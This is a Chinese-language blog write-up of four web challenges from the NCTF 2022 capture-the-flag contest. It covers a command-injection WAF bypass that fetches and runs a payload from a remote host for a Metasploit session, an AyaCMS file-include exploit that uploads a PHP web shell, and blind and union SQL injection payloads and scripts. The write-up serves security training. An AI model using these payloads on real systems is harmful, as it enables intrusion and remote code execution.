---
title: "NCTF 2022 Web Writeup"
date: 2022-12-05T13:50:34+08:00
lastmod: 2022-12-05T13:50:34+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

被队友们带飞了, 最后总榜第十 校内第二

<!--more-->

## calc

右键 /source 源码

```python
@app.route("/calc",methods=['GET'])
def calc():
    ip = request.remote_addr
    num = request.values.get("num")
    log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip,num)
    
    if waf(num):
        try:
            data = eval(num)
            os.system(log)
        except:
            pass
        return str(data)
    else:
        return "waf!!"
```

flask 报错可以看到 waf 的过滤规则

```
http://162.14.110.241:8050/calc?num[]=
```

```python
def waf(s):
    blacklist = ['import','(',')','#','@','^','$',',','>','?','`',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag= False
            print(no)
            break
    return flag
```

试了一圈发现可以对 num 操作一下, 用 `%0a` 分隔不同命令, `%09` 代替空格

然后注意需要使语句正常执行 `eval(num)`, 不然就不会跳到 `os.system(log)` 这句, 解决方法是用单引号把命令包起来

```
/calc?num=%0a'curl'%09'gtwq54.dnslog.cn'%0a
```

因为过滤了反引号不好外带回显, 索性直接用 curl 下载 payload 配合 msf 上线

```
/calc?num=%0a'curl'%09'http://x.x.x.x:yyyy/testapp'%09'-o'%09'/tmp/testapp'%0a
/calc?num=%0a'chmod'%09'777'%09'/tmp/testapp'%0a
/calc?num=%0a'/tmp/testapp'%0a
```

![image-20221203140818575](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031408772.png)

## ez_php

ayacms github 地址

[https://github.com/loadream/AyaCMS](https://github.com/loadream/AyaCMS)

issues 里能看到很多漏洞, 但是全都要登录后台/前台

后台 admin.php 试了弱口令无果, 前台也无法注册...

于是直接下载源码进行代码审计, 然后看了大半天

源码很多地方开头都有 `defined('IN_AYA') or exit('Access Denied');`, 即不能直接访问, 必须要通过其它已经定义 `IN_AYA` 常量的 php 文件来 include 或 require 才行

这样思路就转换为寻找存在文件包含的漏洞点

找了好久在 /aya/admin.inc.php 找到一处

![image-20221203194607945](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031946153.png)

其中的 `get_cookie` 获取带有 `aya_` 前缀的 cookie 值, decrypt 也能找到对应 encrypt 函数的源码

加密过程中的 `AYA_KEY` 就是默认值 `aaa`

有了文件包含之后思路就广了许多, 然后结合一下已知漏洞

[https://github.com/loadream/AyaCMS/issues/3](https://github.com/loadream/AyaCMS/issues/3)

payload

```php
<?php

function random($length=4,$chars='abcdefghijklmnopqrstuvwxyz'){
	$hash='';
	$max=strlen($chars)-1;
	for($i=0;$i<$length;$i++){
		$hash.=$chars[mt_rand(0,$max)];
	}
	return $hash;
}

function kecrypt($txt,$key){
	$key=md5($key);
	$len=strlen($txt);
	$ctr=0;
	$str='';
	for($i=0;$i<$len;$i++){
		$ctr=$ctr==32?0:$ctr;
		$str.=$txt[$i]^$key[$ctr++];
	}
	return $str;
}

function encrypt($txt,$key=''){
	$key or $key='aaa';
	$rnd=random(32);
	$len=strlen($txt);
	$ctr=0;
	$str='';
	for($i=0;$i<$len;$i++){
		$ctr=$ctr==32?0:$ctr;
		$str.=$rnd[$ctr].($txt[$i]^$rnd[$ctr++]);
	}
	return str_replace('=','',base64_encode(kecrypt($str,$key)));
}

echo encrypt('../module/admin/fst_upload');
```

http 包

```
POST /aya/admin.inc.php HTTP/1.1
Host: 81.70.155.160
Content-Length: 244
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykhsd4wQ8UBmzCnD1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: aya_admin_lang=QWwPIAJ9EitZZEEoQWtYOFA0DCUAMFttV2ANPBUlRmFNKBRmFTEQG1ZxTDFaaVEyQyMWdA
Connection: close

------WebKitFormBoundarykhsd4wQ8UBmzCnD1
Content-Disposition: form-data; name="upfile"; filename="xzxz123123123.php"
Content-Type: application/octet-stream

<?php eval($_REQUEST[1]);phpinfo();?>
------WebKitFormBoundarykhsd4wQ8UBmzCnD1

```

![image-20221203195238224](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031952309.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031953539.png)

![image-20221203195402783](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031954835.png)

## ezbypass

hint 提示 waf 是 modsecurity

网上找到一篇参考文章

[https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html](https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html)

剩下就是照着它的 payload 用脚本直接梭, 因为题目提示 `Can you find my password?`, 所以猜 password 列的内容就行

```python
import requests
import time

flag = ''

i = 1

while True:

    min = 32
    max = 127

    while min < max:
        time.sleep(0.08)
        mid = (min + max) // 2
        print(chr(mid))

        payload = 'if(ascii 1.e(substring(1.e(select password from users.info),{},1))>{},1,0)'.format(i, mid)
        url = 'http://162.14.110.241:8099/sql.php?id={}'.format(payload)
        res = requests.get(url)
        if 'letian' in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1

    print('found', flag)
```

![image-20221203212353384](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212032123517.png)

## ez_sql

题目描述给了源码

app.js

```javascript
import { Application, Router, helpers } from "https://deno.land/x/oak/mod.ts";
import Flight from './db.js';

const app = new Application();
const router = new Router();

router.get('/', async(ctx) => {
    ctx.response.body = 'check your flight `/flight?id=`';
});

router.get('/flight', async(ctx) => {
    const id = helpers.getQuery(ctx, { mergeParams: true });
    const info = await Flight.select({departure: 'departure', destination: 'destination'}).where(id).all();
    ctx.response.body = info;
});

app.use(router.routes());
app.use(router.allowedMethods());

app.listen({ port: 3000, hostname: '0.0.0.0' });
```

db.js

```javascript
import { DataTypes, Database, Model, SQLite3Connector} from "https://deno.land/x/denodb@v1.0.40/mod.ts";

const connector = new SQLite3Connector({
    filepath: '/tmp/flight.db'
});

const db = new Database(connector);

class Flight extends Model {
    static table = 'flight';
  
    static fields = {
      id: { primaryKey: true, autoIncrement: true },
      departure: DataTypes.STRING,
      destination: DataTypes.STRING,
    };
}

class Flag extends Model {
    static table = 'flag';

    static fields = {
        flag: DataTypes.STRING,
    };
}

db.link([Flight, Flag]);

await db.sync({ drop: true });

await Flight.create({
    departure: 'Paris',
    destination: 'Tokyo',
});

await Flight.create({
    departure: 'Las Vegas',
    destination: 'Washington',
});

await Flight.create({
    departure: 'London',
    destination: 'San Francisco',
});

await Flag.create({
    flag: Deno.env.get('flag'),
});

export default Flight
```

跟 Hack.lu 2022 foodAPI 几乎一模一样, 参考文章如下

[https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/](https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/)

[https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98](https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98)

[https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436](https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436)

唯一的区别是原题 id 用的是 restful api 的形式, 而这道题是 get 传参, 不能直接照抄 exp

不过稍微看一下文章中分析的原理就能知道思路是利用参数 `?` 来拼接 sql 语句, 所以仿照原来的 payload 将 `?` 作为另一个 get query 传递进去

```
http://81.70.155.160:3000/flight?id=1&?=a` and 0 union select flag,2 from flag;
```

![image-20221204144938461](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212041449665.png)